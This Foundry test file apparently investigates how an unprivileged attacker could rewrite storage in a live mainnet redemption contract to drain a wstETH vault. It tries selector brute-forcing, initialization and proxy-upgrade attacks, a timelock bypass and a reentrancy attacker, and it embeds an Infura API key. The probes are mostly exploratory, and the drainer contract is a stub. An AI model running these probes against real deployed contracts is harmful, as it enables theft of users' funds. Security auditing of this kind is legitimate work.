// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * STORAGE WRITE VECTORS INVESTIGATION
 *
 * CONFIRMED: Immediate drain is possible if we can modify:
 * - R0 slot 4 (delay) - set to 0
 * - Redemption timestamp - backdate it
 *
 * Now searching for vectors to achieve storage modification as unprivileged user.
 */
contract StorageWriteVectors is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_ScanAllR0Functions() public {
        console.log("=== SCAN ALL R0 FUNCTIONS ===\n");

        // Try all possible function selectors that might allow storage write
        bytes4[] memory selectors = new bytes4[](30);
        selectors[0] = bytes4(keccak256("setDelay(uint256)"));
        selectors[1] = bytes4(keccak256("setVault(address)"));
        selectors[2] = bytes4(keccak256("setAsset(address)"));
        selectors[3] = bytes4(keccak256("setTAsset(address)"));
        selectors[4] = bytes4(keccak256("setOwner(address)"));
        selectors[5] = bytes4(keccak256("transferOwnership(address)"));
        selectors[6] = bytes4(keccak256("setAdmin(address)"));
        selectors[7] = bytes4(keccak256("initialize(address)"));
        selectors[8] = bytes4(keccak256("initialize(address,address)"));
        selectors[9] = bytes4(keccak256("reinitialize()"));
        selectors[10] = bytes4(keccak256("upgrade(address)"));
        selectors[11] = bytes4(keccak256("upgradeTo(address)"));
        selectors[12] = bytes4(keccak256("updateDelay(uint256)"));
        selectors[13] = bytes4(keccak256("setRedemptionDelay(uint256)"));
        selectors[14] = bytes4(keccak256("setCooldown(uint256)"));
        selectors[15] = bytes4(keccak256("setConfig(uint256,uint256)"));
        selectors[16] = bytes4(keccak256("setParams(uint256,uint256,uint256)"));
        selectors[17] = bytes4(keccak256("execute(address,bytes)"));
        selectors[18] = bytes4(keccak256("delegatecall(address,bytes)"));
        selectors[19] = bytes4(keccak256("call(address,bytes)"));
        selectors[20] = bytes4(keccak256("multicall(bytes[])"));
        selectors[21] = bytes4(keccak256("batch(bytes[])"));
        selectors[22] = bytes4(keccak256("selfDestruct()"));
        selectors[23] = bytes4(keccak256("destroy()"));
        selectors[24] = bytes4(keccak256("renounceOwnership()"));
        selectors[25] = bytes4(keccak256("acceptOwnership()"));
        selectors[26] = bytes4(keccak256("claimOwnership()"));
        selectors[27] = bytes4(keccak256("grantRole(bytes32,address)"));
        selectors[28] = bytes4(keccak256("revokeRole(bytes32,address)"));
        selectors[29] = bytes4(keccak256("setRoleAdmin(bytes32,bytes32)"));

        vm.startPrank(attacker);

        console.log("Testing selectors...");
        for (uint i = 0; i < selectors.length; i++) {
            // Try with attacker address as param
            (bool s,) = R0.call(abi.encodeWithSelector(selectors[i], attacker));
            if (s) {
                console.log("Selector %d succeeded!", i);
                console.logBytes4(selectors[i]);
            }
        }

        vm.stopPrank();
    }

    function test_InitializationAttack() public {
        console.log("=== INITIALIZATION ATTACK ===\n");

        // Check if R0 is initializable
        // Look for initialized flag in storage

        // Try various initialize functions
        vm.startPrank(attacker);

        // initialize()
        (bool s1,) = R0.call(abi.encodeWithSignature("initialize()"));
        console.log("initialize():", s1);

        // initialize(address)
        (bool s2,) = R0.call(abi.encodeWithSignature("initialize(address)", attacker));
        console.log("initialize(address):", s2);

        // initialize(address,address)
        (bool s3,) = R0.call(abi.encodeWithSignature("initialize(address,address)", attacker, attacker));
        console.log("initialize(address,address):", s3);

        // initialize(address,address,address)
        (bool s4,) = R0.call(abi.encodeWithSignature("initialize(address,address,address)", attacker, attacker, attacker));
        console.log("initialize(address,address,address):", s4);

        // initializeRedemption(...)
        (bool s5,) = R0.call(abi.encodeWithSignature("initializeRedemption(uint256)", 0));
        console.log("initializeRedemption(uint256):", s5);

        vm.stopPrank();

        // Check if any state changed
        bytes32 slot0After = vm.load(R0, bytes32(uint256(0)));
        console.log("\nR0 slot 0 after:");
        console.logBytes32(slot0After);
    }

    function test_UpgradeAttack() public {
        console.log("=== UPGRADE ATTACK ===\n");

        // Check if there's an upgradeable proxy vulnerability
        // If implementation can be changed, we can drain

        // EIP-1967 implementation slot
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 implValue = vm.load(R0, implSlot);

        console.log("EIP-1967 implementation slot:");
        console.logBytes32(implValue);

        if (uint256(implValue) == 0) {
            console.log("No EIP-1967 implementation - not a standard proxy");
        }

        // Try upgrade functions
        vm.startPrank(attacker);

        MaliciousDrainer drainer = new MaliciousDrainer();
        console.log("Malicious implementation:", address(drainer));

        (bool s1,) = R0.call(abi.encodeWithSignature("upgradeTo(address)", address(drainer)));
        console.log("upgradeTo:", s1);

        (bool s2,) = R0.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(drainer), ""));
        console.log("upgradeToAndCall:", s2);

        (bool s3,) = R0.call(abi.encodeWithSignature("setImplementation(address)", address(drainer)));
        console.log("setImplementation:", s3);

        vm.stopPrank();
    }

    function test_TimelockBypass() public {
        console.log("=== TIMELOCK BYPASS ===\n");

        // R0 slot 0 is timelock address
        // Can we bypass timelock somehow?

        console.log("Timelock:", TIMELOCK);

        // Check timelock storage
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(TIMELOCK, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Timelock slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // Check timelock's minimum delay
        (bool s1, bytes memory d1) = TIMELOCK.staticcall(abi.encodeWithSignature("getMinDelay()"));
        if (s1 && d1.length > 0) {
            uint256 minDelay = abi.decode(d1, (uint256));
            console.log("Timelock min delay:", minDelay / 3600, "hours");
        }

        // Check if there are any pending operations we can execute
        // hashOperation(target, value, data, predecessor, salt) -> id
        // isOperationReady(id) -> bool
        // execute(target, value, data, predecessor, salt)

        // Try to execute arbitrary operation
        vm.startPrank(attacker);

        bytes memory setDelayCall = abi.encodeWithSignature("setDelay(uint256)", 0);
        bytes32 opId = keccak256(abi.encode(R0, 0, setDelayCall, bytes32(0), bytes32(0)));

        (bool isReady,) = TIMELOCK.staticcall(abi.encodeWithSignature("isOperationReady(bytes32)", opId));
        console.log("setDelay(0) operation ready:", isReady);

        // Try to schedule and execute
        (bool scheduleSuccess,) = TIMELOCK.call(
            abi.encodeWithSignature(
                "schedule(address,uint256,bytes,bytes32,bytes32,uint256)",
                R0, 0, setDelayCall, bytes32(0), bytes32(0), 0
            )
        );
        console.log("Schedule:", scheduleSuccess);

        vm.stopPrank();
    }

    function test_DelegateCallChain() public {
        console.log("=== DELEGATECALL CHAIN ===\n");

        // R0 -> RC via delegatecall
        // Can we chain delegatecalls to reach a vulnerable target?

        // RC's code might have a delegatecall to another contract
        // That could allow us to execute arbitrary code in R0's context

        bytes memory rcCode = RC.code;
        console.log("RC code size:", rcCode.length);

        // Look for DELEGATECALL opcode (0xF4) in RC
        console.log("Searching for DELEGATECALL in RC...");
        uint count = 0;
        for (uint i = 0; i < rcCode.length - 1; i++) {
            if (uint8(rcCode[i]) == 0xF4) {
                console.log("Found DELEGATECALL at offset:", i);
                count++;
            }
        }
        console.log("Total DELEGATECALL opcodes:", count);

        // If RC has delegatecall, what does it delegatecall to?
        // The target is usually loaded from storage

        // R0's storage slot 5 = IAU (empty address!)
        // If RC delegatecalls to slot 5 value, and slot 5 is empty...
        // Calls to empty addresses succeed with no effect

        // But what if we could deploy code at that address?
    }

    function test_StorageCollisionAttack() public {
        console.log("=== STORAGE COLLISION ATTACK ===\n");

        // Can user-controlled data collide with critical storage slots?
        //
        // If redemptions are stored at keccak256(user, 5)
        // And we can control 'user', can we find a collision with slot 4 (delay)?

        // We need: keccak256(attackerControlled, 5) == bytes32(4)
        // This is computationally infeasible (256-bit preimage)

        console.log("Target slot: 4 (delay)");

        // More realistic: can array elements collide?
        // Array at keccak256(abi.encode(user, 5))
        // Elements at keccak256(arraySlot) + index

        // If we create many redemptions, the element slots grow
        // Can they overflow and wrap around to slot 4?

        deal(TASSET, attacker, type(uint256).max);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Calculate how many redemptions would be needed
        bytes32 arraySlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 elem0Slot = keccak256(abi.encode(arraySlot));

        console.log("Array slot:");
        console.logBytes32(arraySlot);
        console.log("Element 0 slot:");
        console.logBytes32(elem0Slot);

        // To collide with slot 4:
        // elem0Slot + N == 4
        // N = 4 - elem0Slot (mod 2^256)
        // This is effectively random, so collision is infeasible

        vm.stopPrank();

        console.log("Storage collision is computationally infeasible");
    }

    function test_CreateDeploymentAtSlot5() public {
        console.log("=== CREATE DEPLOYMENT AT SLOT 5 ===\n");

        // R0's slot 5 currently = 0
        // Can we create a redemption that somehow sets slot 5?

        // Check current state
        bytes32 slot5Before = vm.load(R0, bytes32(uint256(5)));
        console.log("R0 slot 5 before:");
        console.logBytes32(slot5Before);

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        bytes32 slot5After = vm.load(R0, bytes32(uint256(5)));
        console.log("R0 slot 5 after redeem:");
        console.logBytes32(slot5After);

        // slot 5 is the base for user mappings
        // keccak256(user, 5) gives the array length slot
        // This means slot 5 itself isn't directly written

        // BUT: the mapping key could potentially be crafted to write to slot 5
        // If there was a bug where they used user address directly as slot...
    }

    function test_ReentrancyStorageWrite() public {
        console.log("=== REENTRANCY STORAGE WRITE ===\n");

        // If we can reenter during redeem/finalize, can we corrupt state?

        // Deploy reentrancy attacker
        ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(R0, TASSET, wstETH);

        deal(TASSET, address(reentrancyAttacker), 10000e18);

        // Try reentrancy attack
        console.log("Attempting reentrancy attack...");
        reentrancyAttacker.attack();

        console.log("Reentrancy attacker wstETH:", IERC20(wstETH).balanceOf(address(reentrancyAttacker)) / 1e18);
    }

    function test_FlashLoanStorageWrite() public {
        console.log("=== FLASH LOAN STORAGE WRITE ===\n");

        // Flash loan to temporarily increase balances and bypass checks

        // The key insight: if there's a check like "require(balance >= X)"
        // Flash loan can temporarily satisfy that

        // But for storage write, we need an actual write path...

        // Check if R0 has any function that writes based on caller's balance
        console.log("Checking balance-based writes...");

        // Nothing obvious - R0's redeem takes an amount parameter, not balance
    }
}

contract MaliciousDrainer {
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;

    function drain(address to) external {
        uint256 balance = IERC20(wstETH).balanceOf(VAULT);
        // This would need actual implementation
    }
}

contract ReentrancyAttacker {
    address public r0;
    address public tasset;
    address public wsteth;
    uint public reentryCount;
    bool public attacking;

    constructor(address _r0, address _tasset, address _wsteth) {
        r0 = _r0;
        tasset = _tasset;
        wsteth = _wsteth;
    }

    function attack() external {
        attacking = true;
        IERC20(tasset).approve(r0, type(uint256).max);
        r0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        attacking = false;
    }

    fallback() external {
        if (attacking && reentryCount < 3) {
            reentryCount++;
            r0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        }
    }
}
